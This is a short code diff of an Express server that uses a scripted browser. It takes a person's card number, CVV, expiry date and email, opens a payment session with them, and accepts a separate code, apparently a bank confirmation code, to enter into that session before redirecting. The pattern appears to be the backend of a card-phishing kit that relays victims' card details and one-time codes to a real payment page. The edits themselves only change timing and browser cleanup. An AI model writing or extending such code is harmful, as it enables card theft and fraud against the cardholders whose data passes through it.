@@ -78,20 +78,19 @@ const write_data = async (toCard, amount, fromCard,cvv, expireDate, email) => {
     await page.waitForTimeout(5000);
 
     obj[toCard+fromCard] = await page.url()
-    await browser.close()
-    return toCard+fromCard
+    page.waitForTimeout(60000)
 }
 app.post('/sendData', async (req, res) => {
         const {toCard,amount, fromCard, cvv, expireDate, email} = req.body
-        const result = await write_data(toCard,amount, fromCard, cvv, expireDate, email)
-        return res.status(200).json({id: result})
+        write_data(toCard,amount, fromCard, cvv, expireDate, email)
+        return res.status(200).json({id: toCard+fromCard})
 })
 
 app.get('/token/:id/:code', async (req, res) => {
   console.log(3)
   const {id, code} = req.params
   const result = await code_enter(code, obj[id])
-  console.log(obj[id], 2)
+  console.log(obj[id], 2,)
   if(result === 1) { 
     return res.redirect(returnURL) 
   } else if (result === 0) { 
